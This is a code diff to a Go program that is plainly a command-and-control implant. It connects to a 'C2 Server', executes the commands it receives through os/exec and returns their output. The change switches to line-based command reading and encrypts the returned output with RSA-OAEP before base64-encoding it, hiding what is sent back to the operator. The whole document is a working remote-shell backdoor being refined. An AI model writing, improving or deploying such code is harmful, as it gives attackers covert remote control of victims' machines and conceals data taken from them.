@@ -1,14 +1,18 @@
 package main
 
 import (
+	"bufio"
+	"crypto/rand"
 	"crypto/rsa"
+	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"encoding/pem"
 	"fmt"
 	"io/ioutil"
-	"net"
 	"os/exec"
+	"strings"
 )
 
 var publicKey *rsa.PublicKey
@@ -26,8 +30,9 @@ func main() {
 	defer conn.Close()
 
 	fmt.Println("[+] Connected to C2 Server")
+	reader := bufio.NewReader(conn)
 	for {
-		command, err := receiveCommand(conn)
+		command, err := receiveCommand(reader)
 		if err != nil {
 			fmt.Println("[-] Connection closed")
 			break
@@ -36,7 +41,13 @@ func main() {
 			continue
 		}
 		output := executeCommand(command)
-		conn.Write([]byte(output + "\n"))
+		encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, []byte(output), nil)
+		if err != nil {
+			fmt.Println("[-] Encryption failed")
+			continue
+		}
+		b64 := base64.StdEncoding.EncodeToString(encrypted)
+		conn.Write([]byte(b64 + "\n"))
 	}
 }
 
@@ -58,13 +69,12 @@ func loadPublicKey() {
 	publicKey = pub
 }
 
-func receiveCommand(conn net.Conn) (string, error) {
-	buf := make([]byte, 1024)
-	n, err := conn.Read(buf)
+func receiveCommand(r *bufio.Reader) (string, error) {
+	line, err := r.ReadString('\n')
 	if err != nil {
 		return "", err
 	}
-	return string(buf[:n]), nil
+	return strings.TrimSpace(line), nil
 }
 
 func executeCommand(cmd string) string {
